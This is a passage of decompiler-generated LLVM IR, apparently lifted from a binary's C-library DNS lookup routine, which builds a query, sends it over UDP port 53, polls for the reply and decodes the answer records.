  %v4_10025878 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527832, i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  store i32 268589188, i32* @lr, align 4
  %v1_10025880 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  %v0_10025888 = load i32, i32* @r22, align 4
  %v1_10025888 = icmp slt i32 %v0_10025888, 0
  %v0_1002588c = load i32, i32* @r26, align 4
  %v1_1002588c = mul i32 %v0_1002588c, 4
  store i32 %v1_1002588c, i32* %r0.global-to-local, align 4
  %v2_10025890 = add i32 %v1_1002588c, %arg4
  %v3_10025890 = inttoptr i32 %v2_10025890 to i32*
  %v4_10025890 = load i32, i32* %v3_10025890, align 4
  store i32 %v4_10025890, i32* %r29.global-to-local, align 4
  br i1 %v1_10025888, label %dec_label_pc_100258d8, label %dec_label_pc_10025898

dec_label_pc_10025898:                            ; preds = %dec_label_pc_10025850
  %v3_1002589c = load i32, i32* @global_var_10045270.1367, align 4
  store i32 %v3_1002589c, i32* %r0.global-to-local, align 4
  %v2_100258a0 = icmp slt i32 %v0_10025888, %v3_1002589c
  br i1 %v2_100258a0, label %dec_label_pc_100258a8, label %dec_label_pc_100258d8

dec_label_pc_100258a8:                            ; preds = %dec_label_pc_10025898
  store i32 ptrtoint (i32* @global_var_1002fb28.1368 to i32), i32* @r4, align 4
  %v0_100258b4 = load i32, i32* @r21, align 4
  store i32 268589244, i32* @lr, align 4
  %v4_100258b8 = inttoptr i32 %v0_100258b4 to i8*
  %v5_100258b8 = call i32 @__GI_strncat(i8* %v4_100258b8, i32 ptrtoint (i32* @global_var_1002fb28.1368 to i32), i32 1025, i32 268697600)
  %v0_100258c0 = load i32, i32* @r22, align 4
  %v1_100258c0 = mul i32 %v0_100258c0, 4
  store i32 %v1_100258c0, i32* %r0.global-to-local, align 4
  %v2_100258c8 = add i32 %v1_100258c0, ptrtoint (i32* @global_var_1004eed4.1369 to i32)
  %v3_100258c8 = inttoptr i32 %v2_100258c8 to i32*
  %v4_100258c8 = load i32, i32* %v3_100258c8, align 4
  store i32 %v4_100258c8, i32* @r4, align 4
  %v0_100258cc = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100258d8.1370 to i32), i32* @lr, align 4
  %v4_100258d4 = inttoptr i32 %v0_100258cc to i8*
  %v5_100258d4 = call i32 @__GI_strncat(i8* %v4_100258d4, i32 %v4_100258c8, i32 1025, i32 ptrtoint (i32* @global_var_1004eed4.1369 to i32))
  br label %dec_label_pc_100258d8

dec_label_pc_100258d8:                            ; preds = %dec_label_pc_10025898, %dec_label_pc_10025850, %dec_label_pc_100258a8
  store i32 %v2_10025790, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100258e4.1371 to i32), i32* @lr, align 4
  %v0_100258e0 = call i32 @__pthread_cleanup_pop_restore()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100258ec = load i32, i32* @r30, align 4
  %v1_100258ec = load i32, i32* @r28, align 4
  %v2_100258ec = add i32 %v1_100258ec, %v0_100258ec
  %v1_100258f0 = sub i32 512, %v1_100258ec
  %v0_100258f8 = load i32, i32* @r21, align 4
  store i32 %v0_100258f8, i32* %stack_var_-240, align 4
  store i32 268589316, i32* @lr, align 4
  %v4_10025900 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_100258ec, i32 %v1_100258f0)
  store i32 %v4_10025900, i32* @r27, align 4
  %v1_10025904 = icmp slt i32 %v4_10025900, 0
  br i1 %v1_10025904, label %dec_label_pc_10025d10, label %dec_label_pc_1002590c

dec_label_pc_1002590c:                            ; preds = %dec_label_pc_100258d8
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10025914 = load i32, i32* @r29, align 4
  store i32 %v0_10025914, i32* @r4, align 4
  store i32 %v2_10025918, i32* @r5, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268589348, i32* @lr, align 4
  %v3_10025920 = call i32 @inet_pton(i32 10)
  %tmp59 = icmp slt i32 %v3_10025920, 1
  br i1 %tmp59, label %dec_label_pc_10025934thread-pre-split, label %dec_label_pc_1002592c

dec_label_pc_1002592c:                            ; preds = %dec_label_pc_1002590c
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10025934

dec_label_pc_10025934thread-pre-split:            ; preds = %dec_label_pc_1002590c
  %v3_10025934.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10025934

dec_label_pc_10025934:                            ; preds = %dec_label_pc_10025934thread-pre-split, %dec_label_pc_1002592c
  %v3_10025934 = phi i16 [ %v3_10025934.pr, %dec_label_pc_10025934thread-pre-split ], [ 10, %dec_label_pc_1002592c ]
  %v3_10025938 = icmp eq i16 %v3_10025934, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10025938, label %dec_label_pc_10025960, label %dec_label_pc_1002594c

dec_label_pc_1002594c:                            ; preds = %dec_label_pc_10025934
  %v0_10025950 = load i32, i32* @r29, align 4
  store i32 268589404, i32* @lr, align 4
  %v1_10025958 = call i32 @inet_addr(i32 %v0_10025950)
  %v3_10025960.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10025960

dec_label_pc_10025960:                            ; preds = %dec_label_pc_10025934, %dec_label_pc_1002594c
  %v3_10025960 = phi i16 [ 10, %dec_label_pc_10025934 ], [ %v3_10025960.pre, %dec_label_pc_1002594c ]
  %v4_10025960 = sext i16 %v3_10025960 to i32
  store i32 268589424, i32* @lr, align 4
  %v3_1002596c = call i32 @socket(i32 %v4_10025960, i32 2, i32 17)
  store i32 %v3_1002596c, i32* @r19, align 4
  %v1_10025970 = icmp slt i32 %v3_1002596c, 0
  br i1 %v1_10025970, label %dec_label_pc_1002599c, label %dec_label_pc_10025978

dec_label_pc_10025978:                            ; preds = %dec_label_pc_10025960
  store i32 268589444, i32* @lr, align 4
  %v3_10025980 = call i32 @__libc_connect(i32 %v2_10025978, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10025980, -1
  br i1 %tmp60, label %dec_label_pc_100259a4, label %dec_label_pc_1002598c

dec_label_pc_1002598c:                            ; preds = %dec_label_pc_10025978
  %v0_1002598c = call i32 @__errno_location()
  %v1_10025990 = inttoptr i32 %v0_1002598c to i32*
  %v2_10025990 = load i32, i32* %v1_10025990, align 4
  store i32 %v2_10025990, i32* %r0.global-to-local, align 4
  %v3_10025994 = icmp eq i32 %v2_10025990, 101
  br i1 %v3_10025994, label %dec_label_pc_10025cdc, label %dec_label_pc_1002599c

dec_label_pc_1002599c:                            ; preds = %dec_label_pc_1002598c, %dec_label_pc_10025960
  %v0_1002599c = load i32, i32* @r18, align 4
  %v1_1002599c = add i32 %v0_1002599c, 1
  store i32 %v1_1002599c, i32* @r18, align 4
  %tmp61 = icmp ult i32 %v1_1002599c, 3
  br i1 %tmp61, label %dec_label_pc_100257ec, label %dec_label_pc_10025d10

dec_label_pc_100259a4:                            ; preds = %dec_label_pc_10025978
  %v0_100259a4 = load i32, i32* @r28, align 4
  %v1_100259a4 = load i32, i32* @r27, align 4
  %v2_100259a4 = add i32 %v1_100259a4, %v0_100259a4
  %v0_100259a8 = load i32, i32* @r30, align 4
  %v0_100259b0 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_100259b8.1372 to i32), i32* @lr, align 4
  %v4_100259b4 = call i32 @__libc_send(i32 %v0_100259b0, i32 %v0_100259a8, i32 %v2_100259a4, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100259cc = load i32, i32* @r19, align 4
  store i32 %v0_100259cc, i32* %stack_var_-248, align 4
  store i32 268589524, i32* @lr, align 4
  %v3_100259d0 = call i32 @__libc_poll(i32 %v2_100259bc, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_100259d0, 1
  br i1 %tmp62, label %dec_label_pc_10025cdc, label %dec_label_pc_100259dc

dec_label_pc_100259dc:                            ; preds = %dec_label_pc_100259a4
  %v0_100259dc = load i32, i32* @r19, align 4
  %v0_100259e0 = load i32, i32* @r30, align 4
  store i32 268589552, i32* @lr, align 4
  %v4_100259ec = call i32 @__libc_recv(i32 %v0_100259dc, i32 %v0_100259e0, i32 512, i32 0)
  store i32 %v4_100259ec, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_100259ec, 12
  br i1 %tmp63, label %dec_label_pc_10025c84, label %dec_label_pc_100259fc

dec_label_pc_100259fc:                            ; preds = %dec_label_pc_100259dc
  %v0_100259fc = load i32, i32* @r30, align 4
  %v2_10025a04 = inttoptr i32 %v0_100259fc to i8*
  %v3_10025a04 = call i32 @__decode_header(i8* %v2_10025a04, i32 %v2_10025804)
  %v3_10025a08 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10025a08, i32* @r20, align 4
  %v1_10025a0c = load i32, i32* @r25, align 4
  %v4_10025a0c = icmp eq i32 %v3_10025a08, %v1_10025a0c
  br i1 %v4_10025a0c, label %dec_label_pc_10025a14, label %dec_label_pc_10025c84

dec_label_pc_10025a14:                            ; preds = %dec_label_pc_100259fc
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10025a18, label %dec_label_pc_10025c84, label %dec_label_pc_10025a20

dec_label_pc_10025a20:                            ; preds = %dec_label_pc_10025a14
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10025a24, label %dec_label_pc_10025a2c, label %dec_label_pc_10025a94

dec_label_pc_10025a2c:                            ; preds = %dec_label_pc_10025a20
  %v0_10025a2c = load i32, i32* @r17, align 4
  %v3_10025a2c = icmp eq i32 %v0_10025a2c, 0
  br i1 %v3_10025a2c, label %dec_label_pc_10025a34, label %dec_label_pc_10025a88

dec_label_pc_10025a34:                            ; preds = %dec_label_pc_10025a2c
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10025790, i32* @r28, align 4
  %v4_10025a50 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527832, i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  store i32 268589660, i32* @lr, align 4
  %v1_10025a58 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  %v3_10025a60 = load i32, i32* @global_var_10045270.1367, align 4
  store i32 %v3_10025a60, i32* %r29.global-to-local, align 4
  store i32 %v2_10025790, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268589680, i32* @lr, align 4
  %v0_10025a6c = call i32 @__pthread_cleanup_pop_restore()
  %v1_10025a70 = add i32 %v3_10025a60, -1
  store i32 %v1_10025a70, i32* @r29, align 4
  %v0_10025a74 = load i32, i32* @r22, align 4
  %v2_10025a74 = icmp slt i32 %v0_10025a74, %v1_10025a70
  br i1 %v2_10025a74, label %dec_label_pc_10025a7c, label %dec_label_pc_10025a88

dec_label_pc_10025a7c:                            ; preds = %dec_label_pc_10025a34
  %v1_10025a7c = add i32 %v0_10025a74, 1
  store i32 %v1_10025a7c, i32* @r22, align 4
  %v0_10025a80 = load i32, i32* @r20, align 4
  store i32 %v0_10025a80, i32* @r25, align 4
  br label %dec_label_pc_10025cf8thread-pre-split.backedge

dec_label_pc_10025a88:                            ; preds = %dec_label_pc_10025a34, %dec_label_pc_10025a2c
  %v0_10025a88 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10025abc

dec_label_pc_10025a94:                            ; preds = %dec_label_pc_10025a20
  br i1 %v3_10025a94, label %dec_label_pc_10025a9c, label %dec_label_pc_10025c84

dec_label_pc_10025a9c:                            ; preds = %dec_label_pc_10025a94
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_10025ab4, label %dec_label_pc_10025aa8

dec_label_pc_10025aa8:                            ; preds = %dec_label_pc_10025a9c
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_10025ad410 = load i32, i32* @r30, align 4
  store i32 %v0_10025ad410, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10025ac4

dec_label_pc_10025ab4:                            ; preds = %dec_label_pc_10025a9c
  %v0_10025ab4 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10025abc

dec_label_pc_10025abc:                            ; preds = %dec_label_pc_10025a88, %dec_label_pc_10025ab4
  %storemerge3 = phi i32 [ %v0_10025ab4, %dec_label_pc_10025ab4 ], [ %v0_10025a88, %dec_label_pc_10025a88 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10025ab4 ], [ 1, %dec_label_pc_10025a88 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10025abc = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10025abc, align 4
  br label %dec_label_pc_10025d20

dec_label_pc_10025ac4:                            ; preds = %dec_label_pc_10025aa8, %dec_label_pc_10025ac4
  %v0_10025ad414 = phi i32 [ %v0_10025ad410, %dec_label_pc_10025aa8 ], [ %v0_10025ad4, %dec_label_pc_10025ac4 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10025aa8 ], [ %v2_10025ac8, %dec_label_pc_10025ac4 ]
  store i32 268589768, i32* @lr, align 4
  %v2_10025ac4 = call i32 @__length_question(i32 %v0_10025ad414, i32 %storemerge213)
  %v0_10025ac8 = load i32, i32* %r28.global-to-local, align 4
  %v2_10025ac8 = add i32 %v0_10025ac8, %v2_10025ac4
  %v0_10025ad8.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10025ac8, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10025ac8, i32* @r4, align 4
  %v0_10025ad4 = load i32, i32* @r30, align 4
  store i32 %v0_10025ad4, i32* @r3, align 4
  %v2_10025ad8 = icmp slt i32 %v0_10025ad8.pr, 1
  %v1_10025adc = add i32 %v0_10025ad8.pr, 1
  store i32 %v1_10025adc, i32* %r29.global-to-local, align 4
  br i1 %v2_10025ad8, label %dec_label_pc_10025ac4, label %dec_label_pc_10025ae4

dec_label_pc_10025ae4:                            ; preds = %dec_label_pc_10025ac4
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10025aa0, label %dec_label_pc_10025c30, label %dec_label_pc_10025c38

dec_label_pc_10025af4:                            ; preds = %dec_label_pc_10025c30
  store i32 %v2_10025af4, i32* %r29.global-to-local, align 4
  %v0_10025af8 = load i32, i32* @r30, align 4
  store i32 268589836, i32* @lr, align 4
  %v5_10025b08 = call i32 @__decode_answer(i32 %v0_10025af8, i32 %v0_10025afc, i32 %v1_10025c30, i32* nonnull %stack_var_-184)
  store i32 %v5_10025b08, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10025b08, -1
  br i1 %tmp64, label %dec_label_pc_10025b2c, label %dec_label_pc_10025b14

dec_label_pc_10025b14:                            ; preds = %dec_label_pc_10025af4
  %v0_10025b14 = load i32, i32* @r24, align 4
  %v3_10025b14 = icmp eq i32 %v0_10025b14, 0
  br i1 %v3_10025b14, label %dec_label_pc_10025c84, label %dec_label_pc_10025b1c

dec_label_pc_10025b1c:                            ; preds = %dec_label_pc_10025b14
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10025b20, label %dec_label_pc_10025c84, label %dec_label_pc_10025c38

dec_label_pc_10025b2c:                            ; preds = %dec_label_pc_10025af4
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10025b30 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10025b30, label %dec_label_pc_10025bd4, label %dec_label_pc_10025b38

dec_label_pc_10025b38:                            ; preds = %dec_label_pc_10025b2c
  %v0_10025b38 = load i32, i32* @r31, align 4
  store i32 %v2_10025af4, i32* @r4, align 4
  %v1_10025b40 = add i32 %v0_10025b38, 28
  %v2_10025b40 = inttoptr i32 %v1_10025b40 to i32*
  %v3_10025b40 = load i32, i32* %v2_10025b40, align 4
  store i32 %v3_10025b40, i32* %r0.global-to-local, align 4
  store i32 %v0_10025b38, i32* @r3, align 4
  %v1_10025b48 = add i32 %v0_10025b38, 36
  %v2_10025b48 = inttoptr i32 %v1_10025b48 to i32*
  %v3_10025b48 = load i32, i32* %v2_10025b48, align 4
  store i32 %v3_10025b48, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268589920, i32* @lr, align 4
  %v0_10025b5c = call i32 @memcpy()
  %v0_10025b60 = load i32, i32* @r31, align 4
  %v1_10025b60 = add i32 %v0_10025b60, 4
  %v2_10025b60 = inttoptr i32 %v1_10025b60 to i32*
  %v3_10025b60 = load i32, i32* %v2_10025b60, align 4
  %v3_10025b64 = icmp eq i32 %v3_10025b60, 24
  br i1 %v3_10025b64, label %dec_label_pc_10025b38.dec_label_pc_10025b88_crit_edge, label %dec_label_pc_10025b6c

dec_label_pc_10025b38.dec_label_pc_10025b88_crit_edge: ; preds = %dec_label_pc_10025b38
  %v1_10025b88.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_10025b88

dec_label_pc_10025b6c:                            ; preds = %dec_label_pc_10025b38
  %v1_10025b6c = add i32 %v0_10025b60, 28
  %v2_10025b6c = inttoptr i32 %v1_10025b6c to i32*
  %v3_10025b6c = load i32, i32* %v2_10025b6c, align 4
  store i32 %v3_10025b6c, i32* %r0.global-to-local, align 4
  %v3_10025b70 = icmp eq i32 %v3_10025b6c, 0
  br i1 %v3_10025b70, label %dec_label_pc_10025c38, label %dec_label_pc_10025b78

dec_label_pc_10025b78:                            ; preds = %dec_label_pc_10025b6c
  %v0_10025b78 = load i32, i32* @r16, align 4
  %v3_10025b78 = icmp eq i32 %v0_10025b78, 1
  br i1 %v3_10025b78, label %dec_label_pc_10025b88, label %dec_label_pc_10025b80

dec_label_pc_10025b80:                            ; preds = %dec_label_pc_10025b78
  %v3_10025b80 = icmp eq i32 %v0_10025b78, 28
  br i1 %v3_10025b80, label %dec_label_pc_10025b88, label %dec_label_pc_10025c38

dec_label_pc_10025b88:                            ; preds = %dec_label_pc_10025b38.dec_label_pc_10025b88_crit_edge, %dec_label_pc_10025b80, %dec_label_pc_10025b78
  %v1_10025b88 = phi i32 [ %v1_10025b88.pre, %dec_label_pc_10025b38.dec_label_pc_10025b88_crit_edge ], [ 28, %dec_label_pc_10025b80 ], [ 1, %dec_label_pc_10025b78 ]
  %v4_10025b88 = icmp eq i32 %v3_10025b60, %v1_10025b88
  br i1 %v4_10025b88, label %dec_label_pc_10025b9c, label %dec_label_pc_10025b90

dec_label_pc_10025b90:                            ; preds = %dec_label_pc_10025b88
  %v1_10025b90 = inttoptr i32 %v0_10025b60 to i32*
  %v2_10025b90 = load i32, i32* %v1_10025b90, align 4
  store i32 %v2_10025b90, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10025b98.1375 to i32), i32* @lr, align 4
  %v0_10025b94 = call i32 @free()
  br label %dec_label_pc_10025c1c

dec_label_pc_10025b9c:                            ; preds = %dec_label_pc_10025b88
  %v1_10025ba0 = add i32 %v0_10025b60, 16
  %v2_10025ba0 = inttoptr i32 %v1_10025ba0 to i32*
  %v3_10025ba0 = load i32, i32* %v2_10025ba0, align 4
  store i32 %v3_10025ba0, i32* %r11.global-to-local, align 4
  %v1_10025ba4 = add i32 %v0_10025b60, 32
  %v2_10025ba4 = inttoptr i32 %v1_10025ba4 to i32*
  %v3_10025ba4 = load i32, i32* %v2_10025ba4, align 4
  store i32 %v3_10025ba4, i32* %r0.global-to-local, align 4
  %v0_10025ba8 = load i32, i32* @r24, align 4
  %v2_10025ba8 = sub i32 %tmp35, %v0_10025ba8
  %v1_10025bac = add i32 %v2_10025ba8, -1
  %v1_10025bb0 = add i32 %v3_10025ba0, 4
  %v2_10025bb4 = mul i32 %v1_10025bac, %v1_10025bb0
  store i32 %v2_10025bb4, i32* %r11.global-to-local, align 4
  %v2_10025bb8 = add i32 %v0_10025b60, 36
  %v3_10025bb8 = inttoptr i32 %v2_10025bb8 to i32*
  store i32 %v1_10025bac, i32* %v3_10025bb8, align 4
  %v0_10025bbc = load i32, i32* %r11.global-to-local, align 4
  %v1_10025bbc = load i32, i32* %r0.global-to-local, align 4
  %v3_10025bbc = icmp ugt i32 %v0_10025bbc, %v1_10025bbc
  br i1 %v3_10025bbc, label %dec_label_pc_10025c38, label %dec_label_pc_10025bc4

dec_label_pc_10025bc4:                            ; preds = %dec_label_pc_10025b9c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10025bcc = load i32, i32* @r31, align 4
  %v2_10025bcc = add i32 %v1_10025bcc, 36
  %v3_10025bcc = inttoptr i32 %v2_10025bcc to i32*
  store i32 0, i32* %v3_10025bcc, align 4
  br label %dec_label_pc_10025c1c

dec_label_pc_10025bd4:                            ; preds = %dec_label_pc_10025b2c
  %v3_10025bd4 = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_10025bd4, i32* @r3, align 4
  store i32 268590044, i32* @lr, align 4
  %v0_10025bd8 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10025be0 = load i32, i32* @r16, align 4
  %v4_10025be0 = icmp eq i32 %tmp29, %v1_10025be0
  br i1 %v4_10025be0, label %dec_label_pc_10025be8, label %dec_label_pc_10025c1c

dec_label_pc_10025be8:                            ; preds = %dec_label_pc_10025bd4
  %v0_10025be8 = load i32, i32* @r31, align 4
  %v1_10025be8 = add i32 %v0_10025be8, 16
  %v2_10025be8 = inttoptr i32 %v1_10025be8 to i32*
  %v3_10025be8 = load i32, i32* %v2_10025be8, align 4
  store i32 %v3_10025be8, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10025bf0 = icmp eq i32 %v3_10025be8, %tmp28
  br i1 %v4_10025bf0, label %dec_label_pc_10025bf8, label %dec_label_pc_10025c7c

dec_label_pc_10025bf8:                            ; preds = %dec_label_pc_10025be8
  %v1_10025bf8 = add i32 %v0_10025be8, 36
  %v2_10025bf8 = inttoptr i32 %v1_10025bf8 to i32*
  %v3_10025bf8 = load i32, i32* %v2_10025bf8, align 4
  %v1_10025bfc = add i32 %v0_10025be8, 28
  %v2_10025bfc = inttoptr i32 %v1_10025bfc to i32*
  %v3_10025bfc = load i32, i32* %v2_10025bfc, align 4
  store i32 %v3_10025bfc, i32* %r0.global-to-local, align 4
  %v2_10025c04 = mul i32 %v3_10025bf8, %tmp28
  %v2_10025c08 = add i32 %v3_10025bfc, %v2_10025c04
  store i32 %v2_10025c08, i32* @r3, align 4
  store i32 268590096, i32* @lr, align 4
  %v0_10025c0c = call i32 @memcpy()
  %v0_10025c10 = load i32, i32* @r31, align 4
  %v1_10025c10 = add i32 %v0_10025c10, 36
  %v2_10025c10 = inttoptr i32 %v1_10025c10 to i32*
  %v3_10025c10 = load i32, i32* %v2_10025c10, align 4
  %v1_10025c14 = add i32 %v3_10025c10, 1
  store i32 %v1_10025c14, i32* %v2_10025c10, align 4
  br label %dec_label_pc_10025c1c

dec_label_pc_10025c1c:                            ; preds = %dec_label_pc_10025bd4, %dec_label_pc_10025bc4, %dec_label_pc_10025b90, %dec_label_pc_10025bf8
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10025bf8 ], [ 0, %dec_label_pc_10025bd4 ], [ 0, %dec_label_pc_10025bc4 ], [ %stack_var_-88.118, %dec_label_pc_10025b90 ]
  %v0_10025c1c = load i32, i32* @r28, align 4
  %v1_10025c1c = load i32, i32* %r15.global-to-local, align 4
  %v2_10025c1c = add i32 %v1_10025c1c, %v0_10025c1c
  store i32 %v2_10025c1c, i32* %r28.global-to-local, align 4
  %v0_10025c20 = load i32, i32* @r24, align 4
  %v1_10025c20 = add i32 %v0_10025c20, 1
  store i32 %v1_10025c20, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10025c28 = icmp slt i32 %v1_10025c20, %tmp35
  br i1 %v2_10025c28, label %dec_label_pc_10025c30, label %dec_label_pc_10025c38

dec_label_pc_10025c30:                            ; preds = %dec_label_pc_10025ae4, %dec_label_pc_10025c1c
  %v0_10025afc = phi i32 [ %v2_10025c1c, %dec_label_pc_10025c1c ], [ %v2_10025ac8, %dec_label_pc_10025ae4 ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10025c1c ], [ 1, %dec_label_pc_10025ae4 ]
  %v1_10025c30 = load i32, i32* @r27, align 4
  %v2_10025c30 = icmp slt i32 %v0_10025afc, %v1_10025c30
  br i1 %v2_10025c30, label %dec_label_pc_10025af4, label %dec_label_pc_10025c38

dec_label_pc_10025c38:                            ; preds = %dec_label_pc_10025b1c, %dec_label_pc_10025ae4, %dec_label_pc_10025c30, %dec_label_pc_10025b6c, %dec_label_pc_10025b9c, %dec_label_pc_10025c1c, %dec_label_pc_10025b80
  %v0_10025c38 = load i32, i32* @r19, align 4
  store i32 268590144, i32* @lr, align 4
  %v1_10025c3c = call i32 @__libc_close(i32 %v0_10025c38)
  %v3_10025c44 = icmp eq i32 %arg5, 0
  %v0_10025c54 = load i32, i32* @r30, align 4
  br i1 %v3_10025c44, label %dec_label_pc_10025c54, label %dec_label_pc_10025c4c

dec_label_pc_10025c4c:                            ; preds = %dec_label_pc_10025c38
  %v2_10025c4c = inttoptr i32 %arg5 to i32*
  store i32 %v0_10025c54, i32* %v2_10025c4c, align 4
  br label %dec_label_pc_10025c5c

dec_label_pc_10025c54:                            ; preds = %dec_label_pc_10025c38
  store i32 %v0_10025c54, i32* @r3, align 4
  store i32 268590172, i32* @lr, align 4
  %v0_10025c58 = call i32 @free()
  br label %dec_label_pc_10025c5c

dec_label_pc_10025c5c:                            ; preds = %dec_label_pc_10025c4c, %dec_label_pc_10025c54
  %v0_10025c5c = load i32, i32* @r21, align 4
  store i32 %v0_10025c5c, i32* @r3, align 4
  store i32 268763136, i32* %r29.global-to-local, align 4
  store i32 268590184, i32* @lr, align 4
  %v0_10025c64 = call i32 @free()
  store i32 ptrtoint (i32* @global_var_1004db38.1363 to i32), i32* @r29, align 4
  br label %dec_label_pc_10025d60

dec_label_pc_10025c7c:                            ; preds = %dec_label_pc_10025be8
  %v1_10025c7c = inttoptr i32 %v0_10025be8 to i32*
  %v2_10025c7c = load i32, i32* %v1_10025c7c, align 4
  store i32 %v2_10025c7c, i32* @r3, align 4
  store i32 268590212, i32* @lr, align 4
  %v0_10025c80 = call i32 @free()
  br label %dec_label_pc_10025c84

dec_label_pc_10025c84:                            ; preds = %dec_label_pc_10025a94, %dec_label_pc_100259fc, %dec_label_pc_10025b1c, %dec_label_pc_10025b14, %dec_label_pc_10025a14, %dec_label_pc_100259dc, %dec_label_pc_10025c7c
  %v0_10025c84 = load i32, i32* @r17, align 4
  %v3_10025c84 = icmp eq i32 %v0_10025c84, 0
  br i1 %v3_10025c84, label %dec_label_pc_10025c8c, label %dec_label_pc_10025cdc

dec_label_pc_10025c8c:                            ; preds = %dec_label_pc_10025c84
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10025790, i32* @r28, align 4
  %v4_10025ca8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527832, i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  store i32 268590260, i32* @lr, align 4
  %v1_10025cb0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  %v3_10025cb8 = load i32, i32* @global_var_10045270.1367, align 4
  store i32 %v3_10025cb8, i32* %r29.global-to-local, align 4
  store i32 %v2_10025790, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268590280, i32* @lr, align 4
  %v0_10025cc4 = call i32 @__pthread_cleanup_pop_restore()
  %v1_10025cc8 = add i32 %v3_10025cb8, -1
  store i32 %v1_10025cc8, i32* @r29, align 4
  %v0_10025ccc = load i32, i32* @r22, align 4
  %v2_10025ccc = icmp slt i32 %v0_10025ccc, %v1_10025cc8
  br i1 %v2_10025ccc, label %dec_label_pc_10025cd4, label %dec_label_pc_10025cdc

dec_label_pc_10025cd4:                            ; preds = %dec_label_pc_10025c8c
  %v1_10025cd4 = add i32 %v0_10025ccc, 1
  store i32 %v1_10025cd4, i32* @r22, align 4
  br label %dec_label_pc_10025cf8thread-pre-split.backedge

dec_label_pc_10025cf8thread-pre-split.backedge:   ; preds = %dec_label_pc_10025cd4, %dec_label_pc_10025a7c, %dec_label_pc_10025cf4
  %v0_10025cf8.pr = load i32, i32* @r18, align 4
  %tmp65 = icmp ult i32 %v0_10025cf8.pr, 3
  br i1 %tmp65, label %dec_label_pc_100257ec.lr.ph, label %dec_label_pc_10025d10

dec_label_pc_10025cdc:                            ; preds = %dec_label_pc_1002598c, %dec_label_pc_10025c8c, %dec_label_pc_10025c84, %dec_label_pc_100259a4
  %v0_10025cdc = load i32, i32* @r26, align 4
  %v1_10025cdc = add i32 %v0_10025cdc, 1
  store i32 %v1_10025cdc, i32* %r0.global-to-local, align 4
  %v1_10025ce0 = load i32, i32* @r23, align 4
  %v2_10025ce0 = srem i32 %v1_10025cdc, %v1_10025ce0
  store i32 %v2_10025ce0, i32* @r26, align 4
  %v5_10025ce8 = icmp eq i32 %v2_10025ce0, 0
  br i1 %v5_10025ce8, label %dec_label_pc_10025cf0, label %dec_label_pc_10025cf4

dec_label_pc_10025cf0:                            ; preds = %dec_label_pc_10025cdc
  %v0_10025cf0 = load i32, i32* @r18, align 4
